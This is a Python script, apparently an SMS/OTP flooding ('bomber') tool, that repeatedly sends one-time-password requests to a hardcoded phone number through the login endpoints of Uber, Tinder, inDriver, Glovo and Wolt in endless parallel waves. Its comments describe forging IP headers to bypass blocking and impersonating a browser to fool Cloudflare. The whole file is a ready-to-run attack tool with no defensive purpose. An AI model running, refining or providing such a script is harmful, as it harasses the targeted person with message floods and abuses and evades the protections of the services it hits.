import asyncio
import random
import time
from curl_cffi.requests import AsyncSession

TARGET_PHONE = "994508880067"

# Beynəlxalq və daha dözümlü OTP nöqtələri
API_LIST = [
    {
        "name": "Uber",
        "url": "https://auth.uber.com/api/v1/auth/otp",
        "method": "POST",
        "json": {"mobile": "+{phone}"}
    },
    {
        "name": "Tinder",
        "url": "https://api.gotinder.com/v2/auth/sms/send",
        "method": "POST",
        "json": {"phone_number": "+{phone}"}
    },
    {
        "name": "Indriver",
        "url": "https://indriver.com/api/v1/auth/sms",
        "method": "POST",
        "json": {"phone": "{phone}"}
    },
    {
        "name": "Glovo",
        "url": "https://glovoapp.com/api/v3/auth/otp",
        "method": "POST",
        "json": {"phone": "+{phone}"}
    },
    {
        "name": "Wolt_Global",
        "url": "https://wolt.com/api/v2/sessions/login",
        "method": "POST",
        "json": {"mobile": "+{phone}"}
    }
]

async def send_otp(session, api, phone):
    nm = api["name"]
    url = api["url"]
    
    # 403-ü aşmaq üçün İP "Spoofing" başlıqları
    headers = {
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
        "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Accept-Language": "en-US,en;q=0.9"
    }

    try:
        data = {k: v.replace("{phone}", phone) if isinstance(v, str) else v 
                for k, v in api.get("json", {}).items()}
        
        # impersonate="chrome120" Cloudflare-i aldatmaq üçündür
        resp = await session.post(url, json=data, headers=headers, impersonate="chrome120", timeout=12)
        
        print(f"[*] {nm} -> Status: {resp.status_code}")
    except:
        pass

async def main():
    print(f"[*] Hakai-OTP-Beast İşə Düşdü: {TARGET_PHONE}")
    async with AsyncSession() as session:
        while True:
            tasks = []
            for api in API_LIST:
                for _ in range(3): # Hər servisə 3 paralel müraciət
                    tasks.append(send_otp(session, api, TARGET_PHONE))
            
            await asyncio.gather(*tasks)
            print("[*] Bir dalğa bitdi. 5 saniyə fasilə...")
            await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
